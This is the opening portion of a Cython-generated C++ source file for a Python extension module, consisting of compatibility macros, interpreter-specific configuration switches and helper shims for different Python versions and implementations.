#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif
#include "Python.h"
#ifndef Py_PYTHON_H
#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
#else
#define CYTHON_ABI "0_29_32"
#define CYTHON_HEX_VERSION 0x001D20F0
#define CYTHON_FUTURE_DIVISION 1
#include <stddef.h>
#ifndef offsetof
#define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(WIN32) && !defined(MS_WINDOWS)
#ifndef __stdcall
#define __stdcall
#endif
#ifndef __cdecl
#define __cdecl
#endif
#ifndef __fastcall
#define __fastcall
#endif
#endif
#ifndef DL_IMPORT
#define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
#define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
#if PY_VERSION_HEX >= 0x02070000
#define HAVE_LONG_LONG
#endif
#endif
#ifndef PY_LONG_LONG
#define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
#define Py_HUGE_VAL HUGE_VAL
#endif
#ifdef PYPY_VERSION
#define CYTHON_COMPILING_IN_PYPY 1
#define CYTHON_COMPILING_IN_PYSTON 0
#define CYTHON_COMPILING_IN_CPYTHON 0
#define CYTHON_COMPILING_IN_NOGIL 0
#undef CYTHON_USE_TYPE_SLOTS
#define CYTHON_USE_TYPE_SLOTS 0
#undef CYTHON_USE_PYTYPE_LOOKUP
#define CYTHON_USE_PYTYPE_LOOKUP 0
#if PY_VERSION_HEX < 0x03050000
#undef CYTHON_USE_ASYNC_SLOTS
#define CYTHON_USE_ASYNC_SLOTS 0
#elif !defined(CYTHON_USE_ASYNC_SLOTS)
#define CYTHON_USE_ASYNC_SLOTS 1
#endif
#undef CYTHON_USE_PYLIST_INTERNALS
#define CYTHON_USE_PYLIST_INTERNALS 0
#undef CYTHON_USE_UNICODE_INTERNALS
#define CYTHON_USE_UNICODE_INTERNALS 0
#undef CYTHON_USE_UNICODE_WRITER
#define CYTHON_USE_UNICODE_WRITER 0
#undef CYTHON_USE_PYLONG_INTERNALS
#define CYTHON_USE_PYLONG_INTERNALS 0
#undef CYTHON_AVOID_BORROWED_REFS
#define CYTHON_AVOID_BORROWED_REFS 1
#undef CYTHON_ASSUME_SAFE_MACROS
#define CYTHON_ASSUME_SAFE_MACROS 0
#undef CYTHON_UNPACK_METHODS
#define CYTHON_UNPACK_METHODS 0
#undef CYTHON_FAST_THREAD_STATE
#define CYTHON_FAST_THREAD_STATE 0
#undef CYTHON_FAST_PYCALL
#define CYTHON_FAST_PYCALL 0
#undef CYTHON_PEP489_MULTI_PHASE_INIT
#define CYTHON_PEP489_MULTI_PHASE_INIT 0
#undef CYTHON_USE_TP_FINALIZE
#define CYTHON_USE_TP_FINALIZE 0
#undef CYTHON_USE_DICT_VERSIONS
#define CYTHON_USE_DICT_VERSIONS 0
#undef CYTHON_USE_EXC_INFO_STACK
#define CYTHON_USE_EXC_INFO_STACK 0
#ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
#define CYTHON_UPDATE_DESCRIPTOR_DOC (PYPY_VERSION_HEX >= 0x07030900)
#endif
#elif defined(PYSTON_VERSION)
#define CYTHON_COMPILING_IN_PYPY 0
#define CYTHON_COMPILING_IN_PYSTON 1
#define CYTHON_COMPILING_IN_CPYTHON 0
#define CYTHON_COMPILING_IN_NOGIL 0
#ifndef CYTHON_USE_TYPE_SLOTS
#define CYTHON_USE_TYPE_SLOTS 1
#endif
#undef CYTHON_USE_PYTYPE_LOOKUP
#define CYTHON_USE_PYTYPE_LOOKUP 0
#undef CYTHON_USE_ASYNC_SLOTS
#define CYTHON_USE_ASYNC_SLOTS 0
#undef CYTHON_USE_PYLIST_INTERNALS
#define CYTHON_USE_PYLIST_INTERNALS 0
#ifndef CYTHON_USE_UNICODE_INTERNALS
#define CYTHON_USE_UNICODE_INTERNALS 1
#endif
#undef CYTHON_USE_UNICODE_WRITER
#define CYTHON_USE_UNICODE_WRITER 0
#undef CYTHON_USE_PYLONG_INTERNALS
#define CYTHON_USE_PYLONG_INTERNALS 0
#ifndef CYTHON_AVOID_BORROWED_REFS
#define CYTHON_AVOID_BORROWED_REFS 0
#endif
#ifndef CYTHON_ASSUME_SAFE_MACROS
#define CYTHON_ASSUME_SAFE_MACROS 1
#endif
#ifndef CYTHON_UNPACK_METHODS
#define CYTHON_UNPACK_METHODS 1
#endif
#undef CYTHON_FAST_THREAD_STATE
#define CYTHON_FAST_THREAD_STATE 0
#undef CYTHON_FAST_PYCALL
#define CYTHON_FAST_PYCALL 0
#undef CYTHON_PEP489_MULTI_PHASE_INIT
#define CYTHON_PEP489_MULTI_PHASE_INIT 0
#undef CYTHON_USE_TP_FINALIZE
#define CYTHON_USE_TP_FINALIZE 0
#undef CYTHON_USE_DICT_VERSIONS
#define CYTHON_USE_DICT_VERSIONS 0
#undef CYTHON_USE_EXC_INFO_STACK
#define CYTHON_USE_EXC_INFO_STACK 0
#ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
#define CYTHON_UPDATE_DESCRIPTOR_DOC 0
#endif
#elif defined(PY_NOGIL)
#define CYTHON_COMPILING_IN_PYPY 0
#define CYTHON_COMPILING_IN_PYSTON 0
#define CYTHON_COMPILING_IN_CPYTHON 0
#define CYTHON_COMPILING_IN_NOGIL 1
#ifndef CYTHON_USE_TYPE_SLOTS
#define CYTHON_USE_TYPE_SLOTS 1
#endif
#undef CYTHON_USE_PYTYPE_LOOKUP
#define CYTHON_USE_PYTYPE_LOOKUP 0
#ifndef CYTHON_USE_ASYNC_SLOTS
#define CYTHON_USE_ASYNC_SLOTS 1
#endif
#undef CYTHON_USE_PYLIST_INTERNALS
#define CYTHON_USE_PYLIST_INTERNALS 0
#ifndef CYTHON_USE_UNICODE_INTERNALS
#define CYTHON_USE_UNICODE_INTERNALS 1
#endif
#undef CYTHON_USE_UNICODE_WRITER
#define CYTHON_USE_UNICODE_WRITER 0
#undef CYTHON_USE_PYLONG_INTERNALS
#define CYTHON_USE_PYLONG_INTERNALS 0
#ifndef CYTHON_AVOID_BORROWED_REFS
#define CYTHON_AVOID_BORROWED_REFS 0
#endif
#ifndef CYTHON_ASSUME_SAFE_MACROS
#define CYTHON_ASSUME_SAFE_MACROS 1
#endif
#ifndef CYTHON_UNPACK_METHODS
#define CYTHON_UNPACK_METHODS 1
#endif
#undef CYTHON_FAST_THREAD_STATE
#define CYTHON_FAST_THREAD_STATE 0
#undef CYTHON_FAST_PYCALL
#define CYTHON_FAST_PYCALL 0
#ifndef CYTHON_PEP489_MULTI_PHASE_INIT
#define CYTHON_PEP489_MULTI_PHASE_INIT 1
#endif
#ifndef CYTHON_USE_TP_FINALIZE
#define CYTHON_USE_TP_FINALIZE 1
#endif
#undef CYTHON_USE_DICT_VERSIONS
#define CYTHON_USE_DICT_VERSIONS 0
#undef CYTHON_USE_EXC_INFO_STACK
#define CYTHON_USE_EXC_INFO_STACK 0
#else
#define CYTHON_COMPILING_IN_PYPY 0
#define CYTHON_COMPILING_IN_PYSTON 0
#define CYTHON_COMPILING_IN_CPYTHON 1
#define CYTHON_COMPILING_IN_NOGIL 0
#ifndef CYTHON_USE_TYPE_SLOTS
#define CYTHON_USE_TYPE_SLOTS 1
#endif
#if PY_VERSION_HEX < 0x02070000
#undef CYTHON_USE_PYTYPE_LOOKUP
#define CYTHON_USE_PYTYPE_LOOKUP 0
#elif !defined(CYTHON_USE_PYTYPE_LOOKUP)
#define CYTHON_USE_PYTYPE_LOOKUP 1
#endif
#if PY_MAJOR_VERSION < 3
#undef CYTHON_USE_ASYNC_SLOTS
#define CYTHON_USE_ASYNC_SLOTS 0
#elif !defined(CYTHON_USE_ASYNC_SLOTS)
#define CYTHON_USE_ASYNC_SLOTS 1
#endif
#if PY_VERSION_HEX < 0x02070000
#undef CYTHON_USE_PYLONG_INTERNALS
#define CYTHON_USE_PYLONG_INTERNALS 0
#elif !defined(CYTHON_USE_PYLONG_INTERNALS)
#define CYTHON_USE_PYLONG_INTERNALS 1
#endif
#ifndef CYTHON_USE_PYLIST_INTERNALS
#define CYTHON_USE_PYLIST_INTERNALS 1
#endif
#ifndef CYTHON_USE_UNICODE_INTERNALS
#define CYTHON_USE_UNICODE_INTERNALS 1
#endif
#if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
#undef CYTHON_USE_UNICODE_WRITER
#define CYTHON_USE_UNICODE_WRITER 0
#elif !defined(CYTHON_USE_UNICODE_WRITER)
#define CYTHON_USE_UNICODE_WRITER 1
#endif
#ifndef CYTHON_AVOID_BORROWED_REFS
#define CYTHON_AVOID_BORROWED_REFS 0
#endif
#ifndef CYTHON_ASSUME_SAFE_MACROS
#define CYTHON_ASSUME_SAFE_MACROS 1
#endif
#ifndef CYTHON_UNPACK_METHODS
#define CYTHON_UNPACK_METHODS 1
#endif
#if PY_VERSION_HEX >= 0x030B00A4
#undef CYTHON_FAST_THREAD_STATE
#define CYTHON_FAST_THREAD_STATE 0
#elif !defined(CYTHON_FAST_THREAD_STATE)
#define CYTHON_FAST_THREAD_STATE 1
#endif
#ifndef CYTHON_FAST_PYCALL
#define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)
#endif
#ifndef CYTHON_PEP489_MULTI_PHASE_INIT
#define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)
#endif
#ifndef CYTHON_USE_TP_FINALIZE
#define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)
#endif
#ifndef CYTHON_USE_DICT_VERSIONS
#define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)
#endif
#if PY_VERSION_HEX >= 0x030B00A4
#undef CYTHON_USE_EXC_INFO_STACK
#define CYTHON_USE_EXC_INFO_STACK 0
#elif !defined(CYTHON_USE_EXC_INFO_STACK)
#define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)
#endif
#ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
#define CYTHON_UPDATE_DESCRIPTOR_DOC 1
#endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if CYTHON_USE_PYLONG_INTERNALS
#if PY_MAJOR_VERSION < 3
#include "longintrepr.h"
#endif
#undef SHIFT
#undef BASE
#undef MASK
#ifdef SIZEOF_VOID_P
enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
#endif
#endif
#ifndef __has_attribute
#define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
#define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
#if defined(__GNUC__)
#define CYTHON_RESTRICT __restrict__
#elif defined(_MSC_VER) && _MSC_VER >= 1400
#define CYTHON_RESTRICT __restrict
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
#define CYTHON_RESTRICT restrict
#else
#define CYTHON_RESTRICT
#endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
#  if defined(__cplusplus)
template<class T> void CYTHON_MAYBE_UNUSED_VAR(const T&) { }
#  else
#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
#ifndef _MSC_STDINT_H_
#if _MSC_VER < 1300
typedef unsigned char     uint8_t;
typedef unsigned int      uint32_t;
#else
typedef unsigned __int8   uint8_t;
typedef unsigned __int32  uint32_t;
#endif
#endif
#else
#include <stdint.h>
#endif
#ifndef CYTHON_FALLTHROUGH
#if defined(__cplusplus) && __cplusplus >= 201103L
#if __has_cpp_attribute(fallthrough)
#define CYTHON_FALLTHROUGH [[fallthrough]]
#elif __has_cpp_attribute(clang::fallthrough)
#define CYTHON_FALLTHROUGH [[clang::fallthrough]]
#elif __has_cpp_attribute(gnu::fallthrough)
#define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
#endif
#endif
#ifndef CYTHON_FALLTHROUGH
#if __has_attribute(fallthrough)
#define CYTHON_FALLTHROUGH __attribute__((fallthrough))
#else
#define CYTHON_FALLTHROUGH
#endif
#endif
#if defined(__clang__ ) && defined(__apple_build_version__)
#if __apple_build_version__ < 7000000
#undef  CYTHON_FALLTHROUGH
#define CYTHON_FALLTHROUGH
#endif
#endif
#endif

#ifndef __cplusplus
#error "Cython files generated with the C++ option must be compiled with a C++ compiler."
#endif
#ifndef CYTHON_INLINE
#if defined(__clang__)
#define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
#else
#define CYTHON_INLINE inline
#endif
#endif
template<typename T>
void __Pyx_call_destructor(T& x) {
    x.~T();
}
template<typename T>
class __Pyx_FakeReference {
public:
    __Pyx_FakeReference() : ptr(NULL) { }
    __Pyx_FakeReference(const T& ref) : ptr(const_cast<T*>(&ref)) { }
    T* operator->() { return ptr; }
    T* operator&() { return ptr; }
    operator T& () { return *ptr; }
    template<typename U> bool operator ==(U other) { return *ptr == other; }
    template<typename U> bool operator !=(U other) { return *ptr != other; }
private:
    T* ptr;
};

#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)
#define Py_OptimizeFlag 0
#endif
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
#define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
#define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#define __Pyx_DefaultClassType PyClass_Type
#else
#define __Pyx_BUILTIN_MODULE_NAME "builtins"
#define __Pyx_DefaultClassType PyType_Type
#if PY_VERSION_HEX >= 0x030B00A1
static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,
    PyObject* code, PyObject* c, PyObject* n, PyObject* v,
    PyObject* fv, PyObject* cell, PyObject* fn,
    PyObject* name, int fline, PyObject* lnos) {
    PyObject* kwds = NULL, * argcount = NULL, * posonlyargcount = NULL, * kwonlyargcount = NULL;
    PyObject* nlocals = NULL, * stacksize = NULL, * flags = NULL, * replace = NULL, * call_result = NULL, * empty = NULL;
    const char* fn_cstr = NULL;
    const char* name_cstr = NULL;
    PyCodeObject* co = NULL;
    PyObject* type, * value, * traceback;
    PyErr_Fetch(&type, &value, &traceback);
    if (!(kwds = PyDict_New())) goto end;
    if (!(argcount = PyLong_FromLong(a))) goto end;
    if (PyDict_SetItemString(kwds, "co_argcount", argcount) != 0) goto end;
    if (!(posonlyargcount = PyLong_FromLong(0))) goto end;
    if (PyDict_SetItemString(kwds, "co_posonlyargcount", posonlyargcount) != 0) goto end;
    if (!(kwonlyargcount = PyLong_FromLong(k))) goto end;
    if (PyDict_SetItemString(kwds, "co_kwonlyargcount", kwonlyargcount) != 0) goto end;
    if (!(nlocals = PyLong_FromLong(l))) goto end;
    if (PyDict_SetItemString(kwds, "co_nlocals", nlocals) != 0) goto end;
    if (!(stacksize = PyLong_FromLong(s))) goto end;
    if (PyDict_SetItemString(kwds, "co_stacksize", stacksize) != 0) goto end;
    if (!(flags = PyLong_FromLong(f))) goto end;
    if (PyDict_SetItemString(kwds, "co_flags", flags) != 0) goto end;
    if (PyDict_SetItemString(kwds, "co_code", code) != 0) goto end;
    if (PyDict_SetItemString(kwds, "co_consts", c) != 0) goto end;
    if (PyDict_SetItemString(kwds, "co_names", n) != 0) goto end;
    if (PyDict_SetItemString(kwds, "co_varnames", v) != 0) goto end;
    if (PyDict_SetItemString(kwds, "co_freevars", fv) != 0) goto end;
    if (PyDict_SetItemString(kwds, "co_cellvars", cell) != 0) goto end;
    if (PyDict_SetItemString(kwds, "co_linetable", lnos) != 0) goto end;
    if (!(fn_cstr = PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;
    if (!(name_cstr = PyUnicode_AsUTF8AndSize(name, NULL))) goto end;
    if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;
    if (!(replace = PyObject_GetAttrString((PyObject*)co, "replace"))) goto cleanup_code_too;
    if (!(empty = PyTuple_New(0))) goto cleanup_code_too;
    if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;
    Py_XDECREF((PyObject*)co);
    co = (PyCodeObject*)call_result;
    call_result = NULL;
    if (0) {
    cleanup_code_too:
        Py_XDECREF((PyObject*)co);
        co = NULL;
    }
end:
    Py_XDECREF(kwds);
    Py_XDECREF(argcount);
    Py_XDECREF(posonlyargcount);
    Py_XDECREF(kwonlyargcount);
    Py_XDECREF(nlocals);
    Py_XDECREF(stacksize);
    Py_XDECREF(replace);
    Py_XDECREF(call_result);
    Py_XDECREF(empty);
    if (type) {
        PyErr_Restore(type, value, traceback);
    }
    return co;
}
#else
#define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
#define __Pyx_DefaultClassType PyType_Type
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
#define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
#define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
#define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
#define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef METH_STACKLESS
#define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
#ifndef METH_FASTCALL
#define METH_FASTCALL 0x80
#endif
typedef PyObject* (*__Pyx_PyCFunctionFast) (PyObject* self, PyObject* const* args, Py_ssize_t nargs);
typedef PyObject* (*__Pyx_PyCFunctionFastWithKeywords) (PyObject* self, PyObject* const* args,
    Py_ssize_t nargs, PyObject* kwnames);
#else
#define __Pyx_PyCFunctionFast _PyCFunctionFast
#define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_FAST_PYCCALL
#define __Pyx_PyFastCFunction_Check(func)\
    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))
#else
#define __Pyx_PyFastCFunction_Check(func) 0
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
#define PyObject_Malloc(s)   PyMem_Malloc(s)
#define PyObject_Free(p)     PyMem_Free(p)
#define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1
#define PyMem_RawMalloc(n)           PyMem_Malloc(n)
#define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)
#define PyMem_RawFree(p)             PyMem_Free(p)
#endif
#if CYTHON_COMPILING_IN_PYSTON
#define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)
#define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)
#else
#define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
#define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000
#define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
#define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
#define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
#define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t* key) {
    *key = PyThread_create_key();
    return 0;
}
static CYTHON_INLINE Py_tss_t* PyThread_tss_alloc(void) {
    Py_tss_t* key = (Py_tss_t*)PyObject_Malloc(sizeof(Py_tss_t));
    *key = Py_tss_NEEDS_INIT;
    return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t* key) {
    PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t* key) {
    return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t* key) {
    PyThread_delete_key(*key);
    *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t* key, void* value) {
    return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void* PyThread_tss_get(Py_tss_t* key) {
    return PyThread_get_key_value(*key);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
#define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
#define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
#define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
#define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
#else
#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)
#endif
#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
#define CYTHON_PEP393_ENABLED 1
#if defined(PyUnicode_IS_READY)
#define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                              0 : _PyUnicode_Ready((PyObject *)(op)))
#else
#define __Pyx_PyUnicode_READY(op)       (0)
#endif
#define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
#define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
#define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
#define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)
#define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
#define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
#define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)
#if defined(PyUnicode_IS_READY) && defined(PyUnicode_GET_SIZE)
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
#define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
#else
#define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
#endif
#else
#define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
#endif
#else
#define CYTHON_PEP393_ENABLED 0
#define PyUnicode_1BYTE_KIND  1
#define PyUnicode_2BYTE_KIND  2
#define PyUnicode_4BYTE_KIND  4
#define __Pyx_PyUnicode_READY(op)       (0)
#define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
#define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
#define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)
#define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))
#define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
#define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
#define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)
#define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
#define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
#define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
#define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
#define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)
#define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)
#define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)
#define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
#define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
#define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
#define PyBaseString_Type            PyUnicode_Type
#define PyStringObject               PyUnicodeObject
#define PyString_Type                PyUnicode_Type
#define PyString_Check               PyUnicode_Check
#define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
#define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
#define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
#define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
#define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#ifndef PySet_CheckExact
#define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
#define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
#define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
#define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
#define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
#define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
#define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
#endif
#if PY_MAJOR_VERSION >= 3
#define PyIntObject                  PyLongObject
#define PyInt_Type                   PyLong_Type
#define PyInt_Check(op)              PyLong_Check(op)
#define PyInt_CheckExact(op)         PyLong_CheckExact(op)
#define PyInt_FromString             PyLong_FromString
#define PyInt_FromUnicode            PyLong_FromUnicode
#define PyInt_FromLong               PyLong_FromLong
#define PyInt_FromSize_t             PyLong_FromSize_t
#define PyInt_FromSsize_t            PyLong_FromSsize_t
#define PyInt_AsLong                 PyLong_AsLong
#define PyInt_AS_LONG                PyLong_AS_LONG
#define PyInt_AsSsize_t              PyLong_AsSsize_t
#define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
#define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
#define PyNumber_Int                 PyNumber_Long
#endif
